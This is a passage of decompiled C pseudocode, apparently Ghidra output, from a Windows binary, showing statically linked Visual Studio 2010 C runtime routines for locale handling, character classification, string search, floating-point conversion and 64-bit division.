___crtLCMapStringA(_locale_t _Plocinfo,LPCWSTR _LocaleName,DWORD _DwMapFlag,LPCSTR _LpSrcStr,
                  int _CchSrc,LPSTR _LpDestStr,int _CchDest,int _Code_page,BOOL _BError)

{
  int iVar1;
  localeinfo_struct local_14;
  int local_c;
  char local_8;
  
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&local_14,_Plocinfo);
  iVar1 = __crtLCMapStringA_stat
                    (&local_14,(ulong)_LocaleName,_DwMapFlag,_LpSrcStr,_CchSrc,_LpDestStr,_CchDest,
                     _Code_page,_BError);
  if (local_8 != '\0') {
    *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
  }
  return iVar1;
}



/* Function: __crtGetStringTypeA_stat */

/* WARNING: Function: __alloca_probe_16 replaced with injection: alloca_probe */
/* Library Function - Single Match
    int __cdecl __crtGetStringTypeA_stat(struct localeinfo_struct *,unsigned long,char const
   *,int,unsigned short *,int,int,int)
   
   Library: Visual Studio 2010 Release */

int __cdecl
__crtGetStringTypeA_stat
          (localeinfo_struct *param_1,ulong param_2,char *param_3,int param_4,ushort *param_5,
          int param_6,int param_7,int param_8)

{
  uint _Size;
  uint uVar1;
  uint cchWideChar;
  LPCWSTR pWVar2;
  int iVar3;
  LPCWSTR lpWideCharStr;
  
  uVar1 = DAT_004191b4 ^ (uint)&stack0xfffffffc;
  if (param_6 == 0) {
    param_6 = param_1->locinfo->lc_codepage;
  }
  cchWideChar = MultiByteToWideChar(param_6,(uint)(param_7 != 0) * 8 + 1,param_3,param_4,(LPWSTR)0x0
                                    ,0);
  if (cchWideChar == 0) goto LAB_0040fd6c;
  lpWideCharStr = (LPCWSTR)0x0;
  if ((0 < (int)cchWideChar) && (cchWideChar < 0x7ffffff1)) {
    _Size = cchWideChar * 2 + 8;
    if (_Size < 0x401) {
      pWVar2 = (LPCWSTR)&stack0xffffffe8;
      lpWideCharStr = (LPCWSTR)&stack0xffffffe8;
      if (&stack0x00000000 != (undefined1 *)0x18) {
LAB_0040fd26:
        lpWideCharStr = pWVar2 + 4;
      }
    }
    else {
      pWVar2 = (LPCWSTR)_malloc(_Size);
      lpWideCharStr = pWVar2;
      if (pWVar2 != (LPCWSTR)0x0) {
        pWVar2[0] = L'\xdddd';
        pWVar2[1] = L'\0';
        goto LAB_0040fd26;
      }
    }
  }
  if (lpWideCharStr != (LPCWSTR)0x0) {
    _memset(lpWideCharStr,0,cchWideChar * 2);
    iVar3 = MultiByteToWideChar(param_6,1,param_3,param_4,lpWideCharStr,cchWideChar);
    if (iVar3 != 0) {
      GetStringTypeW(param_2,lpWideCharStr,iVar3,param_5);
    }
    __freea(lpWideCharStr);
  }
LAB_0040fd6c:
  iVar3 = __security_check_cookie(uVar1 ^ (uint)&stack0xfffffffc);
  return iVar3;
}



/* Function: ___crtGetStringTypeA */

/* Library Function - Single Match
    ___crtGetStringTypeA
   
   Library: Visual Studio 2010 Release */

BOOL __cdecl
___crtGetStringTypeA
          (_locale_t _Plocinfo,DWORD _DWInfoType,LPCSTR _LpSrcStr,int _CchSrc,LPWORD _LpCharType,
          int _Code_page,BOOL _BError)

{
  int iVar1;
  int in_stack_00000020;
  pthreadlocinfo in_stack_ffffffec;
  int local_c;
  char local_8;
  
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&stack0xffffffec,_Plocinfo);
  iVar1 = __crtGetStringTypeA_stat
                    ((localeinfo_struct *)&stack0xffffffec,_DWInfoType,_LpSrcStr,_CchSrc,_LpCharType
                     ,_Code_page,in_stack_00000020,(int)in_stack_ffffffec);
  if (local_8 != '\0') {
    *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
  }
  return iVar1;
}



/* Function: ___free_lc_time */

/* Library Function - Single Match
    ___free_lc_time
   
   Library: Visual Studio 2010 Release */

void __cdecl ___free_lc_time(undefined4 *param_1)

{
  if (param_1 != (undefined4 *)0x0) {
    _free((void *)param_1[1]);
    _free((void *)param_1[2]);
    _free((void *)param_1[3]);
    _free((void *)param_1[4]);
    _free((void *)param_1[5]);
    _free((void *)param_1[6]);
    _free((void *)*param_1);
    _free((void *)param_1[8]);
    _free((void *)param_1[9]);
    _free((void *)param_1[10]);
    _free((void *)param_1[0xb]);
    _free((void *)param_1[0xc]);
    _free((void *)param_1[0xd]);
    _free((void *)param_1[7]);
    _free((void *)param_1[0xe]);
    _free((void *)param_1[0xf]);
    _free((void *)param_1[0x10]);
    _free((void *)param_1[0x11]);
    _free((void *)param_1[0x12]);
    _free((void *)param_1[0x13]);
    _free((void *)param_1[0x14]);
    _free((void *)param_1[0x15]);
    _free((void *)param_1[0x16]);
    _free((void *)param_1[0x17]);
    _free((void *)param_1[0x18]);
    _free((void *)param_1[0x19]);
    _free((void *)param_1[0x1a]);
    _free((void *)param_1[0x1b]);
    _free((void *)param_1[0x1c]);
    _free((void *)param_1[0x1d]);
    _free((void *)param_1[0x1e]);
    _free((void *)param_1[0x1f]);
    _free((void *)param_1[0x20]);
    _free((void *)param_1[0x21]);
    _free((void *)param_1[0x22]);
    _free((void *)param_1[0x23]);
    _free((void *)param_1[0x24]);
    _free((void *)param_1[0x25]);
    _free((void *)param_1[0x26]);
    _free((void *)param_1[0x27]);
    _free((void *)param_1[0x28]);
    _free((void *)param_1[0x29]);
    _free((void *)param_1[0x2a]);
    _free((void *)param_1[0x2f]);
    _free((void *)param_1[0x30]);
    _free((void *)param_1[0x31]);
    _free((void *)param_1[0x32]);
    _free((void *)param_1[0x33]);
    _free((void *)param_1[0x34]);
    _free((void *)param_1[0x2e]);
    _free((void *)param_1[0x36]);
    _free((void *)param_1[0x37]);
    _free((void *)param_1[0x38]);
    _free((void *)param_1[0x39]);
    _free((void *)param_1[0x3a]);
    _free((void *)param_1[0x3b]);
    _free((void *)param_1[0x35]);
    _free((void *)param_1[0x3c]);
    _free((void *)param_1[0x3d]);
    _free((void *)param_1[0x3e]);
    _free((void *)param_1[0x3f]);
    _free((void *)param_1[0x40]);
    _free((void *)param_1[0x41]);
    _free((void *)param_1[0x42]);
    _free((void *)param_1[0x43]);
    _free((void *)param_1[0x44]);
    _free((void *)param_1[0x45]);
    _free((void *)param_1[0x46]);
    _free((void *)param_1[0x47]);
    _free((void *)param_1[0x48]);
    _free((void *)param_1[0x49]);
    _free((void *)param_1[0x4a]);
    _free((void *)param_1[0x4b]);
    _free((void *)param_1[0x4c]);
    _free((void *)param_1[0x4d]);
    _free((void *)param_1[0x4e]);
    _free((void *)param_1[0x4f]);
    _free((void *)param_1[0x50]);
    _free((void *)param_1[0x51]);
    _free((void *)param_1[0x52]);
    _free((void *)param_1[0x53]);
    _free((void *)param_1[0x54]);
    _free((void *)param_1[0x55]);
    _free((void *)param_1[0x56]);
    _free((void *)param_1[0x57]);
    _free((void *)param_1[0x58]);
  }
  return;
}



/* Function: ___free_lconv_num */

/* Library Function - Single Match
    ___free_lconv_num
   
   Library: Visual Studio 2010 Release */

void __cdecl ___free_lconv_num(undefined4 *param_1)

{
  if (param_1 != (undefined4 *)0x0) {
    if ((undefined *)*param_1 != PTR_DAT_00419eb8) {
      _free((undefined *)*param_1);
    }
    if ((undefined *)param_1[1] != PTR_DAT_00419ebc) {
      _free((undefined *)param_1[1]);
    }
    if ((undefined *)param_1[2] != PTR_DAT_00419ec0) {
      _free((undefined *)param_1[2]);
    }
    if ((undefined *)param_1[0xc] != PTR_DAT_00419ee8) {
      _free((undefined *)param_1[0xc]);
    }
    if ((undefined *)param_1[0xd] != PTR_DAT_00419eec) {
      _free((undefined *)param_1[0xd]);
    }
  }
  return;
}



/* Function: ___free_lconv_mon */

/* Library Function - Single Match
    ___free_lconv_mon
   
   Library: Visual Studio 2010 Release */

void __cdecl ___free_lconv_mon(int param_1)

{
  if (param_1 != 0) {
    if (*(undefined **)(param_1 + 0xc) != PTR_DAT_00419ec4) {
      _free(*(undefined **)(param_1 + 0xc));
    }
    if (*(undefined **)(param_1 + 0x10) != PTR_DAT_00419ec8) {
      _free(*(undefined **)(param_1 + 0x10));
    }
    if (*(undefined **)(param_1 + 0x14) != PTR_DAT_00419ecc) {
      _free(*(undefined **)(param_1 + 0x14));
    }
    if (*(undefined **)(param_1 + 0x18) != PTR_DAT_00419ed0) {
      _free(*(undefined **)(param_1 + 0x18));
    }
    if (*(undefined **)(param_1 + 0x1c) != PTR_DAT_00419ed4) {
      _free(*(undefined **)(param_1 + 0x1c));
    }
    if (*(undefined **)(param_1 + 0x20) != PTR_DAT_00419ed8) {
      _free(*(undefined **)(param_1 + 0x20));
    }
    if (*(undefined **)(param_1 + 0x24) != PTR_DAT_00419edc) {
      _free(*(undefined **)(param_1 + 0x24));
    }
    if (*(undefined **)(param_1 + 0x38) != PTR_DAT_00419ef0) {
      _free(*(undefined **)(param_1 + 0x38));
    }
    if (*(undefined **)(param_1 + 0x3c) != PTR_DAT_00419ef4) {
      _free(*(undefined **)(param_1 + 0x3c));
    }
    if (*(undefined **)(param_1 + 0x40) != PTR_DAT_00419ef8) {
      _free(*(undefined **)(param_1 + 0x40));
    }
    if (*(undefined **)(param_1 + 0x44) != PTR_DAT_00419efc) {
      _free(*(undefined **)(param_1 + 0x44));
    }
    if (*(undefined **)(param_1 + 0x48) != PTR_DAT_00419f00) {
      _free(*(undefined **)(param_1 + 0x48));
    }
    if (*(undefined **)(param_1 + 0x4c) != PTR_DAT_00419f04) {
      _free(*(undefined **)(param_1 + 0x4c));
    }
  }
  return;
}



/* Function: __isctype_l */

/* Library Function - Single Match
    __isctype_l
   
   Library: Visual Studio 2010 Release */

int __cdecl __isctype_l(int _C,int _Type,_locale_t _Locale)

{
  int iVar1;
  BOOL BVar2;
  CHAR CVar3;
  localeinfo_struct local_1c;
  int local_14;
  char local_10;
  CHAR local_c;
  CHAR local_b;
  undefined1 local_a;
  ushort local_8 [2];
  
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&local_1c,_Locale);
  if (_C + 1U < 0x101) {
    local_8[0] = *(ushort *)(local_1c.locinfo[1].lc_category[0].locale + _C * 2);
  }
  else {
    iVar1 = __isleadbyte_l(_C >> 8 & 0xff,&local_1c);
    CVar3 = (CHAR)_C;
    if (iVar1 == 0) {
      local_b = '\0';
      iVar1 = 1;
      local_c = CVar3;
    }
    else {
      _C._0_1_ = (CHAR)((uint)_C >> 8);
      local_c = (CHAR)_C;
      local_a = 0;
      iVar1 = 2;
      local_b = CVar3;
    }
    BVar2 = ___crtGetStringTypeA
                      (&local_1c,1,&local_c,iVar1,local_8,(local_1c.locinfo)->lc_codepage,
                       (BOOL)(local_1c.locinfo)->lc_category[0].wlocale);
    if (BVar2 == 0) {
      if (local_10 != '\0') {
        *(uint *)(local_14 + 0x70) = *(uint *)(local_14 + 0x70) & 0xfffffffd;
      }
      return 0;
    }
  }
  if (local_10 != '\0') {
    *(uint *)(local_14 + 0x70) = *(uint *)(local_14 + 0x70) & 0xfffffffd;
  }
  return (uint)local_8[0] & _Type;
}



/* Function: __alloca_probe_16 */

/* WARNING: This is an inlined function */
/* WARNING: Function: __alloca_probe replaced with injection: alloca_probe */
/* Library Function - Single Match
    __alloca_probe_16
   
   Library: Visual Studio 2010 Release */

uint __alloca_probe_16(void)

{
  uint in_EAX;
  uint uVar1;
  
  uVar1 = 4 - in_EAX & 0xf;
  return in_EAX + uVar1 | -(uint)CARRY4(in_EAX,uVar1);
}



/* Function: __alloca_probe_8 */

/* WARNING: This is an inlined function */
/* WARNING: Function: __alloca_probe replaced with injection: alloca_probe */
/* Library Function - Single Match
    __alloca_probe_8
   
   Library: Visual Studio */

uint __alloca_probe_8(void)

{
  uint in_EAX;
  uint uVar1;
  
  uVar1 = 4 - in_EAX & 7;
  return in_EAX + uVar1 | -(uint)CARRY4(in_EAX,uVar1);
}



/* Function: _strcspn */

/* Library Function - Single Match
    _strcspn
   
   Library: Visual Studio */

size_t __cdecl _strcspn(char *_Str,char *_Control)

{
  byte bVar1;
  size_t sVar2;
  byte abStack_28 [32];
  
  abStack_28[0x1c] = 0;
  abStack_28[0x1d] = 0;
  abStack_28[0x1e] = 0;
  abStack_28[0x1f] = 0;
  abStack_28[0x18] = 0;
  abStack_28[0x19] = 0;
  abStack_28[0x1a] = 0;
  abStack_28[0x1b] = 0;
  abStack_28[0x14] = 0;
  abStack_28[0x15] = 0;
  abStack_28[0x16] = 0;
  abStack_28[0x17] = 0;
  abStack_28[0x10] = 0;
  abStack_28[0x11] = 0;
  abStack_28[0x12] = 0;
  abStack_28[0x13] = 0;
  abStack_28[0xc] = 0;
  abStack_28[0xd] = 0;
  abStack_28[0xe] = 0;
  abStack_28[0xf] = 0;
  abStack_28[8] = 0;
  abStack_28[9] = 0;
  abStack_28[10] = 0;
  abStack_28[0xb] = 0;
  abStack_28[4] = 0;
  abStack_28[5] = 0;
  abStack_28[6] = 0;
  abStack_28[7] = 0;
  abStack_28[0] = 0;
  abStack_28[1] = 0;
  abStack_28[2] = 0;
  abStack_28[3] = 0;
  while( true ) {
    bVar1 = *_Control;
    if (bVar1 == 0) break;
    _Control = (char *)((byte *)_Control + 1);
    abStack_28[(int)(uint)bVar1 >> 3] = abStack_28[(int)(uint)bVar1 >> 3] | '\x01' << (bVar1 & 7);
  }
  sVar2 = 0xffffffff;
  do {
    sVar2 = sVar2 + 1;
    bVar1 = *_Str;
    if (bVar1 == 0) {
      return sVar2;
    }
    _Str = (char *)((byte *)_Str + 1);
  } while ((abStack_28[(int)(uint)bVar1 >> 3] >> (bVar1 & 7) & 1) == 0);
  return sVar2;
}



/* Function: _strpbrk */

/* Library Function - Single Match
    _strpbrk
   
   Library: Visual Studio */

char * __cdecl _strpbrk(char *_Str,char *_Control)

{
  byte bVar1;
  byte *pbVar2;
  byte abStack_28 [32];
  
  abStack_28[0x1c] = 0;
  abStack_28[0x1d] = 0;
  abStack_28[0x1e] = 0;
  abStack_28[0x1f] = 0;
  abStack_28[0x18] = 0;
  abStack_28[0x19] = 0;
  abStack_28[0x1a] = 0;
  abStack_28[0x1b] = 0;
  abStack_28[0x14] = 0;
  abStack_28[0x15] = 0;
  abStack_28[0x16] = 0;
  abStack_28[0x17] = 0;
  abStack_28[0x10] = 0;
  abStack_28[0x11] = 0;
  abStack_28[0x12] = 0;
  abStack_28[0x13] = 0;
  abStack_28[0xc] = 0;
  abStack_28[0xd] = 0;
  abStack_28[0xe] = 0;
  abStack_28[0xf] = 0;
  abStack_28[8] = 0;
  abStack_28[9] = 0;
  abStack_28[10] = 0;
  abStack_28[0xb] = 0;
  abStack_28[4] = 0;
  abStack_28[5] = 0;
  abStack_28[6] = 0;
  abStack_28[7] = 0;
  abStack_28[0] = 0;
  abStack_28[1] = 0;
  abStack_28[2] = 0;
  abStack_28[3] = 0;
  while( true ) {
    bVar1 = *_Control;
    if (bVar1 == 0) break;
    _Control = (char *)((byte *)_Control + 1);
    abStack_28[(int)(uint)bVar1 >> 3] = abStack_28[(int)(uint)bVar1 >> 3] | '\x01' << (bVar1 & 7);
  }
  do {
    pbVar2 = (byte *)_Str;
    bVar1 = *pbVar2;
    if (bVar1 == 0) {
      return (char *)(uint)bVar1;
    }
    _Str = (char *)(pbVar2 + 1);
  } while ((abStack_28[(int)(uint)bVar1 >> 3] >> (bVar1 & 7) & 1) == 0);
  return (char *)pbVar2;
}



/* Function: _strrchr */

/* Library Function - Single Match
    _strrchr
   
   Library: Visual Studio 2010 Release */

char * __cdecl _strrchr(char *_Str,int _Ch)

{
  char cVar1;
  int iVar2;
  char *pcVar3;
  char *pcVar4;
  
  iVar2 = -1;
  do {
    pcVar4 = _Str;
    if (iVar2 == 0) break;
    iVar2 = iVar2 + -1;
    pcVar4 = _Str + 1;
    cVar1 = *_Str;
    _Str = pcVar4;
  } while (cVar1 != '\0');
  iVar2 = -(iVar2 + 1);
  pcVar4 = pcVar4 + -1;
  do {
    pcVar3 = pcVar4;
    if (iVar2 == 0) break;
    iVar2 = iVar2 + -1;
    pcVar3 = pcVar4 + -1;
    cVar1 = *pcVar4;
    pcVar4 = pcVar3;
  } while ((char)_Ch != cVar1);
  pcVar3 = pcVar3 + 1;
  if (*pcVar3 != (char)_Ch) {
    pcVar3 = (char *)0x0;
  }
  return pcVar3;
}



/* Function: __isdigit_l */

/* Library Function - Single Match
    __isdigit_l
   
   Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release */

int __cdecl __isdigit_l(int _C,_locale_t _Locale)

{
  uint uVar1;
  localeinfo_struct local_14;
  int local_c;
  char local_8;
  
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&local_14,_Locale);
  if ((int)(local_14.locinfo)->locale_name[3] < 2) {
    uVar1 = *(ushort *)(local_14.locinfo[1].lc_category[0].locale + _C * 2) & 4;
  }
  else {
    uVar1 = __isctype_l(_C,4,&local_14);
  }
  if (local_8 != '\0') {
    *(uint *)(local_c + 0x70) = *(uint *)(local_c + 0x70) & 0xfffffffd;
  }
  return uVar1;
}



/* Function: _isdigit */

/* Library Function - Single Match
    _isdigit
   
   Library: Visual Studio 2010 Release */

int __cdecl _isdigit(int _C)

{
  int iVar1;
  
  if (DAT_0041b92c == 0) {
    return *(ushort *)(PTR_DAT_00419e78 + _C * 2) & 4;
  }
  iVar1 = __isdigit_l(_C,(_locale_t)0x0);
  return iVar1;
}



/* Function: __tolower_l */

/* Library Function - Single Match
    __tolower_l
   
   Library: Visual Studio 2010 Release */

int __cdecl __tolower_l(int _C,_locale_t _Locale)

{
  int iVar1;
  uint uVar2;
  int iVar3;
  int *piVar4;
  CHAR CVar5;
  localeinfo_struct local_1c;
  int local_14;
  char local_10;
  byte local_c;
  undefined1 local_b;
  CHAR local_8;
  CHAR local_7;
  undefined1 local_6;
  
  iVar1 = _C;
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&local_1c,_Locale);
  if ((uint)_C < 0x100) {
    if ((int)(local_1c.locinfo)->locale_name[3] < 2) {
      uVar2 = *(ushort *)(local_1c.locinfo[1].lc_category[0].locale + _C * 2) & 1;
    }
    else {
      uVar2 = __isctype_l(_C,1,&local_1c);
    }
    if (uVar2 == 0) {
LAB_0041052d:
      if (local_10 == '\0') {
        return iVar1;
      }
      *(uint *)(local_14 + 0x70) = *(uint *)(local_14 + 0x70) & 0xfffffffd;
      return iVar1;
    }
    uVar2 = (uint)*(byte *)((int)local_1c.locinfo[1].lc_category[0].wlocale + _C);
  }
  else {
    CVar5 = (CHAR)_C;
    if (((int)(local_1c.locinfo)->locale_name[3] < 2) ||
       (iVar3 = __isleadbyte_l(_C >> 8 & 0xff,&local_1c), iVar3 == 0)) {
      piVar4 = __errno();
      *piVar4 = 0x2a;
      local_7 = '\0';
      iVar3 = 1;
      local_8 = CVar5;
    }
    else {
      _C._0_1_ = (CHAR)((uint)_C >> 8);
      local_8 = (CHAR)_C;
      local_6 = 0;
      iVar3 = 2;
      local_7 = CVar5;
    }
    iVar3 = ___crtLCMapStringA(&local_1c,(local_1c.locinfo)->lc_category[0].wlocale,0x100,&local_8,
                               iVar3,(LPSTR)&local_c,3,(local_1c.locinfo)->lc_codepage,1);
    if (iVar3 == 0) goto LAB_0041052d;
    uVar2 = (uint)local_c;
    if (iVar3 != 1) {
      uVar2 = (uint)CONCAT11(local_c,local_b);
    }
  }
  if (local_10 != '\0') {
    *(uint *)(local_14 + 0x70) = *(uint *)(local_14 + 0x70) & 0xfffffffd;
  }
  return uVar2;
}



/* Function: _tolower */

/* Library Function - Single Match
    _tolower
   
   Library: Visual Studio 2010 Release */

int __cdecl _tolower(int _C)

{
  if (DAT_0041b92c == 0) {
    if (_C - 0x41U < 0x1a) {
      return _C + 0x20;
    }
  }
  else {
    _C = __tolower_l(_C,(_locale_t)0x0);
  }
  return _C;
}



/* Function: FID_conflict:__atoflt_l */

/* Library Function - Multiple Matches With Different Base Names
    __atodbl_l
    __atoflt_l
   
   Library: Visual Studio 2010 Release */

int __cdecl FID_conflict___atoflt_l(_CRT_FLOAT *_Result,char *_Str,_locale_t _Locale)

{
  INTRNCVT_STATUS IVar1;
  int iVar2;
  char *local_2c;
  localeinfo_struct local_28;
  int local_20;
  char local_1c;
  uint local_18;
  _LDBL12 local_14;
  uint local_8;
  
  local_8 = DAT_004191b4 ^ (uint)&stack0xfffffffc;
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&local_28,_Locale);
  local_18 = ___strgtold12_l(&local_14,&local_2c,_Str,0,0,0,0,&local_28);
  IVar1 = FID_conflict___ld12tod(&local_14,(_CRT_DOUBLE *)_Result);
  if ((local_18 & 3) == 0) {
    if (IVar1 == INTRNCVT_OVERFLOW) {
LAB_00410666:
      if (local_1c != '\0') {
        *(uint *)(local_20 + 0x70) = *(uint *)(local_20 + 0x70) & 0xfffffffd;
      }
      goto LAB_004106a6;
    }
    if (IVar1 != INTRNCVT_UNDERFLOW) {
LAB_00410698:
      if (local_1c != '\0') {
        *(uint *)(local_20 + 0x70) = *(uint *)(local_20 + 0x70) & 0xfffffffd;
      }
      goto LAB_004106a6;
    }
  }
  else if ((local_18 & 1) == 0) {
    if ((local_18 & 2) == 0) goto LAB_00410698;
    goto LAB_00410666;
  }
  if (local_1c != '\0') {
    *(uint *)(local_20 + 0x70) = *(uint *)(local_20 + 0x70) & 0xfffffffd;
  }
LAB_004106a6:
  iVar2 = __security_check_cookie(local_8 ^ (uint)&stack0xfffffffc);
  return iVar2;
}



/* Function: FID_conflict:__atoflt_l */

/* Library Function - Multiple Matches With Different Base Names
    __atodbl_l
    __atoflt_l
   
   Library: Visual Studio 2010 Release */

int __cdecl FID_conflict___atoflt_l(_CRT_FLOAT *_Result,char *_Str,_locale_t _Locale)

{
  INTRNCVT_STATUS IVar1;
  int iVar2;
  char *local_2c;
  localeinfo_struct local_28;
  int local_20;
  char local_1c;
  uint local_18;
  _LDBL12 local_14;
  uint local_8;
  
  local_8 = DAT_004191b4 ^ (uint)&stack0xfffffffc;
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&local_28,_Locale);
  local_18 = ___strgtold12_l(&local_14,&local_2c,_Str,0,0,0,0,&local_28);
  IVar1 = FID_conflict___ld12tod(&local_14,(_CRT_DOUBLE *)_Result);
  if ((local_18 & 3) == 0) {
    if (IVar1 == INTRNCVT_OVERFLOW) {
LAB_0041070e:
      if (local_1c != '\0') {
        *(uint *)(local_20 + 0x70) = *(uint *)(local_20 + 0x70) & 0xfffffffd;
      }
      goto LAB_0041074e;
    }
    if (IVar1 != INTRNCVT_UNDERFLOW) {
LAB_00410740:
      if (local_1c != '\0') {
        *(uint *)(local_20 + 0x70) = *(uint *)(local_20 + 0x70) & 0xfffffffd;
      }
      goto LAB_0041074e;
    }
  }
  else if ((local_18 & 1) == 0) {
    if ((local_18 & 2) == 0) goto LAB_00410740;
    goto LAB_0041070e;
  }
  if (local_1c != '\0') {
    *(uint *)(local_20 + 0x70) = *(uint *)(local_20 + 0x70) & 0xfffffffd;
  }
LAB_0041074e:
  iVar2 = __security_check_cookie(local_8 ^ (uint)&stack0xfffffffc);
  return iVar2;
}



/* Function: __fptostr */

/* Library Function - Single Match
    __fptostr
   
   Library: Visual Studio 2010 Release */

errno_t __cdecl __fptostr(char *_Buf,size_t _SizeInBytes,int _Digits,STRFLT _PtFlt)

{
  char *_Str;
  int *piVar1;
  int iVar2;
  char *pcVar3;
  size_t sVar4;
  char cVar5;
  char *pcVar6;
  errno_t eVar7;
  
  pcVar6 = _PtFlt->mantissa;
  if ((_Buf == (char *)0x0) || (_SizeInBytes == 0)) {
    piVar1 = __errno();
    eVar7 = 0x16;
    *piVar1 = 0x16;
  }
  else {
    *_Buf = '\0';
    iVar2 = 0;
    if (0 < _Digits) {
      iVar2 = _Digits;
    }
    if (iVar2 + 1U < _SizeInBytes) {
      _Str = _Buf + 1;
      *_Buf = '0';
      pcVar3 = _Str;
      if (0 < _Digits) {
        do {
          cVar5 = *pcVar6;
          if (cVar5 == '\0') {
            cVar5 = '0';
          }
          else {
            pcVar6 = pcVar6 + 1;
          }
          *pcVar3 = cVar5;
          pcVar3 = pcVar3 + 1;
          _Digits = _Digits + -1;
        } while (0 < _Digits);
      }
      *pcVar3 = '\0';
      if ((-1 < _Digits) && ('4' < *pcVar6)) {
        while (pcVar3 = pcVar3 + -1, *pcVar3 == '9') {
          *pcVar3 = '0';
        }
        *pcVar3 = *pcVar3 + '\x01';
      }
      if (*_Buf == '1') {
        _PtFlt->decpt = _PtFlt->decpt + 1;
      }
      else {
        sVar4 = _strlen(_Str);
        FID_conflict__memcpy(_Buf,_Str,sVar4 + 1);
      }
      return 0;
    }
    piVar1 = __errno();
    eVar7 = 0x22;
    *piVar1 = 0x22;
  }
  FUN_004087f3();
  return eVar7;
}



/* Function: ___dtold */

/* Library Function - Single Match
    ___dtold
   
   Library: Visual Studio 2010 Release */

void __cdecl ___dtold(uint *param_1,uint *param_2)

{
  ushort uVar1;
  ushort uVar2;
  uint uVar3;
  ushort uVar4;
  uint local_8;
  
  uVar1 = *(ushort *)((int)param_2 + 6) >> 4;
  uVar2 = *(ushort *)((int)param_2 + 6) & 0x8000;
  uVar4 = uVar1 & 0x7ff;
  uVar3 = *param_2;
  local_8 = 0x80000000;
  if ((uVar1 & 0x7ff) == 0) {
    if (((param_2[1] & 0xfffff) == 0) && (uVar3 == 0)) {
      param_1[1] = 0;
      *param_1 = 0;
      goto LAB_004108ba;
    }
    uVar4 = uVar4 + 0x3c01;
    local_8 = 0;
  }
  else if (uVar4 == 0x7ff) {
    uVar4 = 0x7fff;
  }
  else {
    uVar4 = uVar4 + 0x3c00;
  }
  local_8 = uVar3 >> 0x15 | (param_2[1] & 0xfffff) << 0xb | local_8;
  uVar3 = uVar3 << 0xb;
  while( true ) {
    *param_1 = uVar3;
    param_1[1] = local_8;
    if ((local_8 & 0x80000000) != 0) break;
    local_8 = local_8 * 2 | *param_1 >> 0x1f;
    uVar3 = *param_1 * 2;
    uVar4 = uVar4 - 1;
  }
  uVar2 = uVar2 | uVar4;
LAB_004108ba:
  *(ushort *)(param_1 + 2) = uVar2;
  return;
}



/* Function: __fltout2 */

/* Library Function - Single Match
    __fltout2
   
   Library: Visual Studio 2010 Release */

STRFLT __cdecl __fltout2(_CRT_DOUBLE _Dbl,STRFLT _Flt,char *_ResultStr,size_t _SizeInBytes)

{
  char *pcVar1;
  int iVar2;
  errno_t eVar3;
  STRFLT p_Var4;
  uint local_34;
  uint uStack_30;
  ushort uStack_2c;
  char *local_28;
  short local_24;
  char local_22;
  char local_20 [24];
  uint local_8;
  
  local_8 = DAT_004191b4 ^ (uint)&stack0xfffffffc;
  local_28 = _ResultStr;
  ___dtold(&local_34,(uint *)&_Dbl);
  iVar2 = _I10_OUTPUT(local_34,uStack_30,uStack_2c,0x11,0,&local_24);
  pcVar1 = local_28;
  _Flt->flag = iVar2;
  _Flt->sign = (int)local_22;
  _Flt->decpt = (int)local_24;
  eVar3 = _strcpy_s(local_28,_SizeInBytes,local_20);
  if (eVar3 == 0) {
    _Flt->mantissa = pcVar1;
    p_Var4 = (STRFLT)__security_check_cookie(local_8 ^ (uint)&stack0xfffffffc);
    return p_Var4;
  }
                    /* WARNING: Subroutine does not return */
  __invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
}



/* Function: __alldvrm */

/* Library Function - Single Match
    __alldvrm
   
   Library: Visual Studio 2010 Release */

undefined8 __alldvrm(uint param_1,uint param_2,uint param_3,uint param_4)

{
  ulonglong uVar1;
  longlong lVar2;
  uint uVar3;
  int iVar4;
  uint uVar5;
  uint uVar6;
  uint uVar7;
  uint uVar8;
  bool bVar10;
  char cVar11;
  uint uVar9;
  
  cVar11 = (int)param_2 < 0;
  if ((bool)cVar11) {
    bVar10 = param_1 != 0;
    param_1 = -param_1;
    param_2 = -(uint)bVar10 - param_2;
  }
  if ((int)param_4 < 0) {
    cVar11 = cVar11 + '\x01';
    bVar10 = param_3 != 0;
    param_3 = -param_3;
    param_4 = -(uint)bVar10 - param_4;
  }
  uVar3 = param_1;
  uVar5 = param_3;
  uVar6 = param_2;
  uVar9 = param_4;
  if (param_4 == 0) {
    uVar3 = param_2 / param_3;
    iVar4 = (int)(((ulonglong)param_2 % (ulonglong)param_3 << 0x20 | (ulonglong)param_1) /
                 (ulonglong)param_3);
  }
  else {
    do {
      uVar8 = uVar9 >> 1;
      uVar5 = uVar5 >> 1 | (uint)((uVar9 & 1) != 0) << 0x1f;
      uVar7 = uVar6 >> 1;
      uVar3 = uVar3 >> 1 | (uint)((uVar6 & 1) != 0) << 0x1f;
      uVar6 = uVar7;
      uVar9 = uVar8;
    } while (uVar8 != 0);
    uVar1 = CONCAT44(uVar7,uVar3) / (ulonglong)uVar5;
    iVar4 = (int)uVar1;
    lVar2 = (ulonglong)param_3 * (uVar1 & 0xffffffff);
    uVar3 = (uint)((ulonglong)lVar2 >> 0x20);
    uVar5 = uVar3 + iVar4 * param_4;
    if (((CARRY4(uVar3,iVar4 * param_4)) || (param_2 < uVar5)) ||
       ((param_2 <= uVar5 && (param_1 < (uint)lVar2)))) {
      iVar4 = iVar4 + -1;
    }
    uVar3 = 0;
  }
  if (cVar11 == '\x01') {
    bVar10 = iVar4 != 0;
    iVar4 = -iVar4;
    uVar3 = -(uint)bVar10 - uVar3;
  }
  return CONCAT44(uVar3,iVar4);
}



/* Function: __aullshr */

/* Library Function - Single Match
    __aullshr
   
   Library: Visual Studio 2010 Release */

ulonglong __fastcall __aullshr(byte param_1,uint param_2)

{
  uint in_EAX;
  
  if (0x3f < param_1) {
    return 0;
  }
  if (param_1 < 0x20) {
    return CONCAT44(param_2 >> (param_1 & 0x1f),
